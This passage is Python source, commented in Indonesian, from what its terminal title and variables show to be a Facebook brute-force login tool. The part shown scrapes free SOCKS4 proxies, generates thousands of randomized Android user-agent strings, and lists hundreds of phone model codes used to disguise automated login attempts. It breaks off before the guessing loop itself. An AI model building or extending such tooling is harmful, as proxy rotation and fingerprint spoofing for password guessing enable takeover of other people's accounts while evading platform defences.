import os

# ------------------[  MODULE  ]-------------------#
M2 = "[#FF0000]"  # MERAH
H2 = "[#00FF00]"  # HIJAU
K2 = "[#FFFF00]"  # KUNING
B2 = "[#00C8FF]"  # BIRU
P2 = "[#FFFFFF]"  # PUTIH
U2 = "[#AF00FF]"  # UNGU
O2 = "[#FF8F00]"  # ORANGE

try:
    import rich
except ImportError:
    os.system("pip install rich")
from rich.console import Console

console = Console()
try:
    import licensing
except ImportError:
    console.print(f" {H2}• {U2}Sedang Menginstall Modul licensing{H2} •{P2}")
    os.system("pip install licensing")
try:
    import rich
except ImportError:
    console.print(f" {H2}• {U2}Sedang Menginstall Modul Rich {H2}•{P2}")
    os.system("pip install rich")
try:
    import stdiomask
except ImportError:
    console.print(f" {H2}• {U2}Sedang Menginstall Modul stdiomask {H2}•{P2}")
    os.system("pip install stdiomask")
try:
    import bs4
except ImportError:
    console.print(f" {H2}• {U2}Sedang Menginstall Modul bs4 {H2}•{P2}")
    os.system("pip install bs4")
# ------------------[ IMPORT MODULE ]-------------------#
import requests, bs4, json, os, sys, random, datetime, time, re, rich, base64, subprocess, uuid, calendar
from time import sleep
from datetime import date, datetime
from rich import pretty
from rich.tree import Tree
from rich.panel import Panel
from rich import print as cetak
from rich import print as rprint
from rich import print as prints
from rich.progress import track
from rich.text import Text as tekz
from rich.console import Console
from rich.text import Text
from rich.columns import Columns
from rich.panel import Panel as nel
from rich.panel import Panel as panel
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as par
from rich.console import Group as gp
from bs4 import BeautifulSoup as parser
from rich.columns import Columns as col
from rich.console import Console as sol
from rich.console import Console
from bs4 import BeautifulSoup as beautifulsoup
from rich.markdown import Markdown as mark
from concurrent.futures import ThreadPoolExecutor as tred
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn
from licensing.models import *
from licensing.methods import Key, Helpers
from concurrent.futures import ThreadPoolExecutor as executor
# ------------------[ GLOBAL NAME ]-------------------#
sekarang = calendar.timegm(time.gmtime(time.time()))
pretty.install()
CON = sol()
wa = Console()
prem = []
ugen=[]
ugent=[]
ugen2 = []
ngentott=[]
temanku = []
console = Console()
ses = requests.Session()
lisensiku=[]
hapus  = '[/]'
id, id2, loop, ok, cp, akun, tokenku, uid, method, pwpluss, pwnya, tokenmu = (
    [],
    [],
    0,
    0,
    0,
    [],
    [],
    [],
    [],
    [],
    [],
    [],
)
(
    dia,
    ualu,
    ualuh,
) = (
    [],
    [],
    [],
)
sys.stdout.write("\x1b]2; BMBF | fanky Brute\x07")
# ------------------[ USER-AGENT ]-------------------#
try:
    prox = requests.get(
        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=80000&country=all&ssl=all&anonymity=all"
    ).text
    open(".prox.txt", "w").write(prox)
except Exception as e:
    Console().print(
        f" {H2}•{P2} Koneksi Internet Anda Tidak Terdeteksi Silahkan Cek Kuota Anda"
    )
    exit()
prox = open(".prox.txt", "r").read().splitlines()

# ------------[ UBAH UA DIH SINI OM ]-----------#
for agenku in range(10000):
    rr = random.randint; rc = random.choice
    bek1 = f"Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-J710FN) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1,30))}.0 Chrome/{str(rr(10,190))}.0.{str(rr(1000,6000))}.{str(rr(10,290))} Mobile Safari/537.36"
    ugen.append(bek1)
    bek2 = f"Mozilla/5.0 (Linux; Android 11; ZTE Blade A51 Lite RU) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1,30))}.0 Chrome/{str(rr(10,190))}.0.{str(rr(1000,6000))}.{str(rr(10,290))} Mobile Safari/537.36"
    ugen.append(bek2)
    bek3 = f"Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-G901F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1,30))}.0 Chrome/{str(rr(10,190))}.0.{str(rr(1000,6000))}.{str(rr(10,290))} Mobile Safari/537.36"
    ugen.append(bek3)
    bek4 = f"Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G531H) AppleWebKit/537.36 (KHTML, like Gecko) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1,30))}.0 Chrome/{str(rr(10,190))}.0.{str(rr(1000,6000))}.{str(rr(10,290))} Mobile Safari/537.36"
    ugen.append(bek4)
    bek5 = f"Mozilla/5.0 (Linux; Android 8.1.0; A95X MAX) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1,30))}.0 Chrome/{str(rr(10,190))}.0.{str(rr(1000,6000))}.{str(rr(10,290))} Mobile Safari/537.36"
    ugen.append(bek5)
    bek6 = f"Mozilla/5.0 (Linux; Android 9; ) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1,30))}.0 Chrome/{str(rr(10,190))}.0.{str(rr(1000,6000))}.{str(rr(10,290))} Mobile Safari/537.36"
    ugen.append(bek6)
    bek7 = f"Mozilla/5.0 (Linux; Android 9; ) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1,30))}.0 Chrome/{str(rr(10,190))}.0.{str(rr(1000,6000))}.{str(rr(10,290))} Mobile Safari/537.36"
    ugen.append(bek7)
    bek8 = f"Mozilla/5.0 (Linux; Android 7.0; ) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1,30))}.0 Chrome/{str(rr(10,190))}.0.{str(rr(1000,6000))}.{str(rr(10,290))} Mobile Safari/537.36"
    ugen.append(bek8)
    bek9 = f"Mozilla/5.0 (Linux; Android 5.0.1; ) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1,30))}.0 Chrome/{str(rr(10,190))}.0.{str(rr(1000,6000))}.{str(rr(10,290))} Mobile Safari/537.36"
    ugen.append(bek9)
    bek10 = f"Mozilla/5.0 (Linux; Android 8.1.0; ) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1,30))}.0 Chrome/{str(rr(10,190))}.0.{str(rr(1000,6000))}.{str(rr(10,290))} Mobile Safari/537.36"
    ugen.append(bek10)
    bek11 = f"Mozilla/5.0 (Linux; Android 9.0; ) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1,30))}.0 Chrome/{str(rr(10,190))}.0.{str(rr(1000,6000))}.{str(rr(10,290))} Mobile Safari/537.36"
    ugen.append(bek11)
    bek12 = f"Mozilla/5.0 (Linux; Android 13; ) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1,30))}.0 Chrome/{str(rr(10,190))}.0.{str(rr(1000,6000))}.{str(rr(10,290))} Mobile Safari/537.36"
    ugen.append(bek12)
    bek13 = f"Mozilla/5.0 (Linux; Android 10; SM-W2021) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36 EdgA/81.0.416.81"
    ugen.append(bek13)
    bek14 = f"Mozilla/5.0 (Linux; Android 13; SM-A055F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/118.0.0.0 Mobile Safari/537.36"
    ugen.append(bek14)
    bek15 = f"Well /5.0 (Linux; Android 5; Samsung Chrome 11 (3180) Build/R103-14816.131.0; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/44.464.442 Tokhs/537.36"
    ugen.append(bek15)
    bek16 = f"Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-M536B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1,30))}.0 Chrome/{str(rr(10,190))}.0.{str(rr(1000,6000))}.{str(rr(10,290))} Mobile Safari/537.36"
    ugen.append(bek16)
    bek17 = f"Mozilla/5.0 (Linux; Android 12; SM-M536B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1,30))}.0 Chrome/{str(rr(10,190))}.0.{str(rr(1000,6000))}.{str(rr(10,290))} Mobile Safari/537.36"
    ugen.append(bek17)
    bek18 = f"Mozilla/5.0 (Linux; Android 12; moto g41) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1,30))}.0 Chrome/{str(rr(10,190))}.0.{str(rr(1000,6000))}.{str(rr(10,290))} Mobile Safari/537.36"
    ugen.append(bek18)
    bek19 = f"Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-J530F/J530FXXS9CUE5) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1,30))}.0 Chrome/{str(rr(10,190))}.0.{str(rr(1000,6000))}.{str(rr(10,290))} Mobile Safari/537.36"
    ugen.append(bek19)
    bek20 = f"Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-M346B1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1,30))}.0 Chrome/{str(rr(10,190))}.0.{str(rr(1000,6000))}.{str(rr(10,290))} Mobile Safari/537.36"
    ugen.append(bek20)
    bek22 = f'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(94,119))}.0.0.0 Mobile Safari/537.36'
    ugen.append(bek22)
    bek21 = f"Mozilla/5.0 (Linux; Android 9; SAMSUNG TicWatch Pro 3 Ultra GPS) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1,30))}.0 Chrome/{str(rr(10,190))}.0.{str(rr(1000,6000))}.{str(rr(10,290))} Mobile Safari/537.36"
    ugen.append(bek21)
    bek22 = f"Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-J415GN) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1,30))} SamsungBrowser/{str(rr(1,30))}.0 Chrome/{str(rr(10,190))}.0.{str(rr(1000,6000))}.{str(rr(10,290))} Mobile Safari/537.36"
    ugen.append(bek22)
    bek23 = f"Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-J610FN) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1,30))}.0 Chrome/{str(rr(10,190))}.0.{str(rr(1000,6000))}.{str(rr(10,290))} Mobile Safari/537.36"
    ugen.append(bek23)
    bek24 = f"Mozilla/5.0 (Linux; Android 5.0.1; SAMSUNG GT-I9506) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1,30))}.0 Chrome/{str(rr(10,190))}.0.{str(rr(1000,6000))}.{str(rr(10,290))} Mobile Safari/537.36"
    ugen.append(bek24)
    bek25 = f"Mozilla/5.0 (Linux; Android 8.1.0; SAMSUNG OW20W2) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1,30))}.0 Chrome/{str(rr(10,190))}.0.{str(rr(1000,6000))}.{str(rr(10,290))} Mobile Safari/537.36"
    ugen.append(bek25)

for xd in range(1000):
   rr = random.randint; rc = random.choice
   aZ = str(rc(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']))
   lonte = f"{str(rc(aZ))}{str(rc(aZ))}{str(rc(aZ))}{str(rr(11,99))}{str(rc(aZ))}"
   build_nokiax = ['JDQ39','JZO54K']
   oppo = ["CPH1869", "CPH1929","CPH2107", "CPH2238", "CPH2389","CPH2401", "CPH2407", "CPH2413", "CPH2415", "CPH2417", "CPH2419", "CPH2455", "CPH2459", "CPH2461", "CPH2471", "CPH2473", "CPH2477", "CPH8893", "CPH2321", "CPH2341", "CPH2373", "CPH2083", "CPH2071", "CPH2077", "CPH2185", "CPH2179", "CPH2269", "CPH2421", "CPH2349", "CPH2271", "CPH1923", "CPH1925", "CPH1837", "CPH2015", "CPH2073", "CPH2081", "CPH2029", "CPH2031", "CPH2137", "CPH1605", "CPH1803", "CPH1853", "CPH1805", "CPH1809", "CPH1851", "CPH1931", "CPH1959", "CPH1933", "CPH1935", "CPH1943", "CPH2061", "CPH2069", "CPH2127", "CPH2131", "CPH2139", "CPH2135", "CPH2239", "CPH2195", "CPH2273", "CPH2325", "CPH2309", "CPH1701", "CPH2387", "CPH1909", "CPH1920", "CPH1912", "CPH1901", "CPH1903", "CPH1905", "CPH1717", "CPH1801", "CPH2067", "CPH2099", "CPH2161", "CPH2219", "CPH2197", "CPH2263", "CPH2375", "CPH2339", "CPH1715", "CPH2385", "CPH1729", "CPH1827", "CPH1938", "CPH1937", "CPH1939", "CPH1941", "CPH2001", "CPH2021", "CPH2059", "CPH2121", "CPH2123", "CPH2203", "CPH2333", "CPH2365", "CPH1913", "CPH1911", "CPH1915", "CPH1969", "CPH2209", "CPH1987", "CPH2095", "CPH2119", "CPH2285", "CPH2213", "CPH2223", "CPH2363", "CPH1609", "CPH1613", "CPH1723", "CPH1727", "CPH1725", "CPH1819", "CPH1821", "CPH1825", "CPH1881", "CPH1823", "CPH1871", "CPH1875", "CPH2023", "CPH2005", "CPH2025", "CPH2207", "CPH2173", "CPH2307", "CPH2305", "CPH2337", "CPH1955", "CPH1707", "CPH1719", "CPH1721", "CPH1835", "CPH1831", "CPH1833", "CPH1879", "CPH1893", "CPH1877", "CPH1607", "CPH1611", "CPH1917", "CPH1919", "CPH1907", "CPH1989", "CPH1945", "CPH1951", "CPH2043", "CPH2035", "CPH2037", "CPH2036", "CPH2009", "CPH2013", "CPH2113", "CPH2091", "CPH2125", "CPH2109", "CPH2089", "CPH2065", "CPH2159", "CPH2145", "CPH2205", "CPH2201", "CPH2199", "CPH2217", "CPH1921", "CPH2211", "CPH2235", "CPH2251", "CPH2249", "CPH2247", "CPH2237", "CPH2371", "CPH2293", "CPH2353", "CPH2343", "CPH2359", "CPH2357", "CPH2457", "CPH1983", "CPH1979"]
   redmi = ["2201116SI", "M2012K11AI", "22011119TI", "21091116UI", "M2102K1AC", "M2012K11I", "22041219I", "22041216I", "2203121C", "2106118C", "2201123G", "2203129G", "2201122G", "2201122C", "2206122SC", "22081212C", "2112123AG", "2112123AC", "2109119BC", "M2002J9G", "M2007J1SC", "M2007J17I", "M2102J2SC", "M2007J3SY", "M2007J17G", "M2007J3SG", "M2011K2G", "M2101K9AG ", "M2101K9R", "2109119DG", "M2101K9G", "2109119DI", "M2012K11G", "M2102K1G", "21081111RG", "2107113SG", "21051182G", "M2105K81AC", "M2105K81C", "21061119DG", "21121119SG", "22011119UY", "21061119AG", "21061119AL", "22041219NY", "22041219G", "21061119BI", "220233L2G", "220233L2I", "220333QNY", "220333QAG", "M2004J7AC", "M2004J7BC", "M2004J19C", "M2006C3MII", "M2010J19SI", "M2006C3LG", "M2006C3LVG", "M2006C3MG", "M2006C3MT", "M2006C3MNG", "M2006C3LII", "M2010J19SL", "M2010J19SG", "M2010J19SY", "M2012K11AC", "M2012K10C", "M2012K11C", "22021211RC"]
   realme =  ["RMX3516", "RMX3371", "RMX3461", "RMX3286", "RMX3561", "RMX3388", "RMX3311", "RMX3142", "RMX2071", "RMX1805", "RMX1809", "RMX1801", "RMX1807", "RMX1803", "RMX1825", "RMX1821", "RMX1822", "RMX1833", "RMX1851", "RMX1853", "RMX1827", "RMX1911", "RMX1919", "RMX1927", "RMX1971", "RMX1973", "RMX2030", "RMX2032", "RMX1925", "RMX1929", "RMX2001", "RMX2061", "RMX2063", "RMX2040", "RMX2042", "RMX2002", "RMX2151", "RMX2163", "RMX2155", "RMX2170", "RMX2103", "RMX3085", "RMX3241", "RMX3081", "RMX3151", "RMX3381", "RMX3521", "RMX3474", "RMX3471", "RMX3472", "RMX3392", "RMX3393", "RMX3491", "RMX1811", "RMX2185", "RMX3231", "RMX2189", "RMX2180", "RMX2195", "RMX2101", "RMX1941", "RMX1945", "RMX3063", "RMX3061", "RMX3201", "RMX3203", "RMX3261", "RMX3263", "RMX3193", "RMX3191", "RMX3195", "RMX3197", "RMX3265", "RMX3268", "RMX3269","RMX2027", "RMX2020","RMX2021", "RMX3581", "RMX3501", "RMX3503", "RMX3511", "RMX3310", "RMX3312", "RMX3551", "RMX3301", "RMX3300", "RMX2202", "RMX3363", "RMX3360", "RMX3366", "RMX3361", "RMX3031", "RMX3370", "RMX3357", "RMX3560", "RMX3562", "RMX3350", "RMX2193", "RMX2161", "RMX2050", "RMX2156", "RMX3242", "RMX3171", "RMX3430", "RMX3235", "RMX3506", "RMX2117", "RMX2173", "RMX3161", "RMX2205", "RMX3462", "RMX3478", "RMX3372", "RMX3574", "RMX1831", "RMX3121", "RMX3122", "RMX3125", "RMX3043", "RMX3042", "RMX3041", "RMX3092", "RMX3093", "RMX3571", "RMX3475", "RMX2200", "RMX2201", "RMX2111", "RMX2112", "RMX1901", "RMX1903", "RMX1992", "RMX1993", "RMX1991", "RMX1931", "RMX2142", "RMX2081", "RMX2085", "RMX2083", "RMX2086", "RMX2144", "RMX2051", "RMX2025", "RMX2075", "RMX2076", "RMX2072", "RMX2052", "RMX2176", "RMX2121", "RMX3115", "RMX1921"]
   infinix = ["X676B", "X687", "X609", "X697", "X680D", "X507", "X605", "X668", "X6815B", "X624", "X655F", "X689C", "X608", "X698", "X682B", "X682C", "X688C", "X688B", "X658E", "X659B", "X689B", "X689", "X689D", "X662", "X662B", "X675", "X6812B", "X6812", "X6817B", "X6817", "X6816C", "X6816", "X6816D", "X668C", "X665B", "X665E", "X510", "X559C", "X559F", "X559", "X606", "X606C", "X606D", "X623", "X624B", "X625C", "X625D", "X625B", "X650D", "X650B", "X650", "X650C", "X655C", "X655D", "X680B", "X573", "X573B", "X622", "X693", "X695C", "X695D", "X695", "X663B", "X663", "X670", "X671", "X671B", "X672", "X6819", "X572", "X572-LTE", "X571", "X604", "X610B", "X690", "X690B", "X656", "X692", "X683", "X450", "X5010", "X501", "X401", "X626", "X626B", "X652", "X652A", "X652B", "X652C", "X660B", "X660C", "X660", "X5515", "X5515F", "X5515I", "X609B", "X5514D", "X5516B", "X5516C", "X627", "X680", "X653", "X653C", "X657", "X657B", "X657C", "X6511B", "X6511E", "X6511", "X6512", "X6823C", "X612B", "X612", "X503", "X511", "X352", "X351", "X530", "X676C", "X6821", "X6823", "X6827", "X509", "X603", "X6815", "X620B", "X620", "X687B", "X6811B", "X6810", "X6811"]
   samsung = ["E025F", "G996B", "A826S", "E135F", "G781B", "G998B", "F936U1", "G361F", "A716S", "J327AZ", "E426B", "A015F", "A015M", "A013G", "A013G", "A013M", "A013F", "A022M", "A022G", "A022F", "A025M", "S124DL", "A025U", "A025A", "A025G", "A025F", "A025AZ", "A035F", "A035M", "A035G", "A032F", "A032M", "A032F", "A037F", "A037U", "A037M", "S134DL", "A037G", "A105G", "A105M", "A105F", "A105FN", "A102U", "S102DL", "A102U1", "A107F", "A107M", "A115AZ", "A115U", "A115U1", "A115A", "A115M", "A115F", "A125F", "A127F", "A125M", "A125U", "A127M", "A135F", "A137F", "A135M", "A136U", "A136U1", "A136W", "A260F", "A260G", "A260F", "A260G", "A205GN", "A205U", "A205F", "A205G", "A205FN", "A202F", "A2070", "A207F", "A207M", "A215U", "A215U1", "A217F", "A217F", "A217M", "A225F", "A225M", "A226B", "A226B", "A226BR", "A235F", "A235M", "A300FU", "A300F", "A300H", "A310F", "A310M", "A320FL", "A320F", "A305G", "A305GT", "A305N", "A305F", "A307FN", "A307G", "A307GN", "A315G", "A315F", "A325F", "A325M", "A326U", "A326W", "A336E", "A336B", "A430F", "A405FN", "A405FM", "A3051", "A3050", "A415F", "A426U", "A426B", "A5009", "A500YZ", "A500Y", "A500W", "A500L", "A500X", "A500XZ", "A510F", "A510Y", "A520F", "A520W", "A500F", "A500FU", "A500H", "S506DL", "A505G", "A505FN", "A505U", "A505GN", "A505F", "A507FN", "A5070", "A515F", "A515U", "A515U1", "A516U", "A516V", "A516N", "A516B", "A525F", "A525M", "A526U", "A526U1", "A526B", "A526W", "A528B", "A536B", "A536U", "A536E", "A536V", "A600FN", "A600G", "A605FN", "A605G", "A605GN", "A605F", "A6050", "A606Y", "A6060", "G6200", "A700FD", "A700F", "A7000", "A700H", "A700YD", "A710F", "A710M", "A720F", "A750F", "A750FN", "A750GN", "A705FN", "A705F", "A705MN", "A707F", "A715F", "A715W", "A716U", "A716V", "A716U1", "A716B", "A725F", "A725M", "A736B", "A530F", "A810YZ", "A810F", "A810S", "A530W", "A530N", "G885F", "G885Y", "G885S", "A730F", "A805F", "G887F", "G8870", "A9000", "A920F", "A920F", "G887N", "A910F", "G8850", "A908B", "A908N", "A9080", "G313HY", "G313MY", "G313MU", "G316M", "G316ML", "G316MY", "G313HZ", "G313H", "G313HU", "G313U", "G318H", "G357FZ","G310HN", "G357FZ", "G850F", "G850M", "J337AZ", "G386T1", "G386T", "G3858", "G3858", "A226L", "C5000", "C500X", "C5010", "C5018", "C7000", "C7010", "C701F", "C7018", "C7100", "C7108", "C9000", "C900F", "C900Y", "G355H", "G355M", "G3589W", "G386W", "G386F", "G3518", "G3586V", "G5108Q", "G5108", "G3568V", "G350E", "G350", "G3509I", "G3508J", "G3502I", "G3502C", "S820L", "G360H", "G360F", "G360T", "G360M", "G361H", "E500H", "E500F", "E500M", "E5000", "E500YZ", "E700H", "E700F", "E7009", "E700M", "G3815", "G3815", "G3815", "F127G", "E225F", "E236B", "F415F", "E5260", "E625F", "F900U", "F907N", "F900F", "F9000", "F907B", "F900W", "G150NL", "G155S", "G1650", "W2015", "G7102", "G7105", "G7106", "G7108", "G7202", "G720N0", "G7200", "G720AX", "G530T1", "G530H", "G530FZ", "G531H", "G530BT", "G532F", "G531BT", "G531M", "J727AZ", "J100FN", "J100H", "J120FN", "J120H", "J120F", "J120M", "J111M", "J111F", "J110H", "J110G", "J110F", "J110M", "J105H", "J105Y", "J105B", "J106H", "J106F", "J106B", "J106M", "J200F", "J200M", "J200G", "J200H", "J200F", "J200GU", "J260M", "J260F", "J260MU", "J260F", "J260G", "J200BT", "G532G", "G532M", "G532MT", "J250M", "J250F", "J210F", "J260AZ", "J3109", "J320A", "J320G", "J320F", "J320H", "J320FN", "J330G", "J330F", "J330FN", "J337V", "J337P", "J337A", "J337VPP", "J337R4", "J327VPP", "J327V", "J327P", "J327R4", "S327VL", "S337TL", "S367VL", "J327A", "J327T1", "J327T", "J3110", "J3119S", "J3119", "S320VL", "J337T", "J400M", "J400F", "J400F", "J410F", "J410G", "J410F", "J415FN", "J415F", "J415G", "J415GN", "J415N", "J500FN", "J500M", "J510MN", "J510FN", "J510GN", "J530Y", "J530F", "J530G", "J530FM", "G570M", "G570F", "G570Y", "J600G", "J600FN", "J600GT", "J600F", "J610F", "J610G", "J610FN", "J710F", "J700H", "J700M", "J700F", "J700P", "J700T", "J710GN", "J700T1", "J727A", "J727R4", "J737T", "J737A", "J737R4", "J737V", "J737T1", "J737S", "J737P", "J737VPP", "J701F", "J701M", "J701MT", "S767VL", "S757BL", "J720F", "J720M", "G615F", "G615FU", "G610F", "G610M", "G610Y", "G611MT", "G611FF", "G611M", "J730G", "J730GM", "J730F", "J730FM", "S727VL", "S737TL", "J727T1", "J727T1", "J727V", "J727P", "J727VPP", "J727T", "C710F", "J810M", "J810F", "J810G", "J810Y", "A605K", "A605K", "A202K", "M336K", "A326K", "C115", "C115L", "C1158", "C1158", "C115W", "C115M", "S120VL", "M015G", "M015F", "M013F", "M017F", "M022G", "M022F", "M022M", "M025F", "M105G", "M105M", "M105F", "M107F", "M115F", "M115F", "M127F", "M127G", "M135M", "M135F", "M135FU", "M205FN", "M205F", "M205G", "M215F", "M215G", "M225FV", "M236B", "M236Q", "M305F", "M305M", "M307F", "M307FN", "M315F", "M317F", "M325FV", "M325F", "M326B", "M336B", "M336BU", "M405F", "M426B", "M515F", "M526BR", "M526B", "M536B", "M625F", "G750H", "G7508Q", "G7509", "N970U", "N970F", "N971N", "N970U1", "N770F", "N975U1", "N975U", "N975F", "N975F", "N976N", "N980F", "N981U", "N981B", "N985F", "N9860", "N986N", "N986U", "N986B", "N986W", "N9008V", "N9006", "N900A", "N9005", "N900W8", "N900", "N9009", "N900P", "N9000Q", "N9002", "9005", "N750L", "N7505", "N750", "N7502", "N910F", "N910V", "N910C", "N910U", "N910H", "N9108V", "N9100", "N915FY", "N9150", "N915T", "N915G", "N915A", "N915F", "N915S", "N915D", "N915W8", "N916S", "N916K", "N916L", "N916LSK", "N920L", "N920S", "N920G", "N920A", "N920C", "N920V", "N920I", "N920K", "N9208", "N930F", "N9300", "N930x", "N930P", "N930X", "N930W8", "N930V", "N930T", "N950U", "N950F", "N950N", "N960U", "N960F", "N960U", "N935F", "N935K", "N935S", "G550T", "G550FY", "G5500", "G5510", "G550T1", "S550TL", "G5520", "G5528", "G600FY", "G600F", "G6000", "G6100", "G610S", "G611F", "G611L", "G110M", "G110H", "G110B", "G910S", "G316HU", "G977N", "G973U1", "G973F", "G973W", "G973U", "G770U1", "G770F", "G975F", "G975U", "G970U", "G970U1", "G970F", "G970N", "G980F", "G981U", "G981N", "G981B", "G780G", "G780F", "G781W", "G781U", "G7810", "G9880", "G988B", "G988U", "G988B", "G988U1", "G985F", "G986U", "G986B", "G986W", "G986U1", "G991U", "G991B", "G990B", "G990E", "G990U", "G998U", "G996W", "G996U", "G996N", "G9960", "S901U", "S901B", "S908U", "S908U1", "S908B","S9080", "S908N", "S908E", "S906U", "S906E", "S906N", "S906B", "S906U1", "G730V", "G730A", "G730W8", "C105L", "C101", "C105", "C105K", "C105S", "G900F", "G900P", "G900H", "G9006V", "G900M", "G900V", "G870W", "G890A", "G870A", "G900FD", "G860P", "G901F", "G901F", "G800F", "G800H", "G903F", "G903W", "G920F", "G920K", "G920I", "G920A", "G920P", "G920S", "G920V", "G920T", "G925F", "G925A", "G925W8", "G928F", "G928C", "G9280", "G9287", "G928T", "G928I", "G930A", "G930F", "G930W8", "G930S", "G930V", "G930P", "G930L", "G891A", "G935F", "G935T", "G935W8", "G9350", "G950F", "G950W", "G950U", "G892A", "G892U", "G8750", "G955F", "G955U", "G955U1", "G955W", "G955N", "G960U", "G960U1", "G960F", "G965U", "G965F", "G965U1", "G965N", "G9650", "J321AZ", "J326AZ", "J336AZ", "T116", "T116NU", "T116NY", "T116NQ", "T2519", "G318HZ", "T255S", "W2016", "W2018", "W2019", "W2021", "W2022", "G600S", "E426S", "G3812", "G3812B", "G3818", "G388F", "G389F", "G390F", "G398FN"]
   gt = ['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550 5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301'